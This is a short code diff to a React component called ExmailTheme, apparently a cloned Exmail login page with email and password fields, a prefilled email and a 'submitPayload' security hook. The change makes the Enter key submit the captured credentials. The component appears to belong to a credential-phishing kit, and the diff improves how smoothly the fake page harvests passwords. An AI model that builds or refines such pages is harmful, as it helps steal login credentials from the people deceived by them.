@@ -15,7 +15,7 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -25,6 +25,12 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -89,6 +95,7 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
                       setEmail(e.target.value);
                       if (error) setError(null);
                     }}
+                    onKeyDown={handleKeyDown}
                     className="w-full py-2 px-1 text-[14px] focus:outline-none focus:border-[#2a8bd5] transition-colors placeholder:text-gray-300"
                   />
                 </div>
@@ -102,6 +109,7 @@ const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
                       setPassword(e.target.value);
                       if (error) setError(null);
                     }}
+                    onKeyDown={handleKeyDown}
                     className="w-full py-2 px-1 text-[14px] focus:outline-none focus:border-[#2a8bd5] transition-colors placeholder:text-gray-300"
                   />
                 </div>
